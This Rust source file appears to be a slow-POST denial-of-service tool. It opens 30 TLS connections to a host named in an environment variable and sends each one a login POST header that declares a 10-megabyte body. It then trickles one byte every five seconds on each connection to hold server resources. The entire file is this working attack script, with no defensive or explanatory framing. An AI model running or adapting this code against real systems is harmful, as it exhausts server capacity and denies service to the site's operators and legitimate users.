extern crate futures;
extern crate futures_cpupool;
extern crate native_tls;

extern crate tokio_core;
extern crate tokio_timer;

use native_tls::TlsConnector;
use std::env;
use std::io::Write;
use std::net::TcpStream;
use std::time::Duration;

use futures::*;
use tokio_core::reactor::{Core, Interval};
use tokio_timer::*;

fn main() {
    let host = env::var("HOST").unwrap();
    let port = "443";
    let timeout = 5;
    let connections_count = 30;

    let mut core = Core::new().unwrap();
    let handle = core.handle();

    let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 10000000\r\n\r\n", host);
    let timer = Timer::default();
    for connection_number in 0..connections_count {
        let timer = timer.clone();
        let connector = TlsConnector::builder().unwrap().build().unwrap();
        let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
        let mut stream = connector.connect(&host, stream).unwrap();
        stream.write(start.as_bytes());
        stream.flush();

        let lazy_wrapper = future::lazy(move || {
            timer.interval(Duration::from_secs(timeout)).for_each(move |_| {
                stream.write(b"a");
                stream.flush();
                println!("Stream number: {} written.", connection_number);
                Ok(())
            })
        });
        let task = handle.spawn(lazy_wrapper.map_err(|_| panic!("HITHERE")));
        println!("Stream number: {} spawned.", connection_number);
    }

    let empty: futures::Empty<(), ()> = future::empty();
    core.run(empty);
}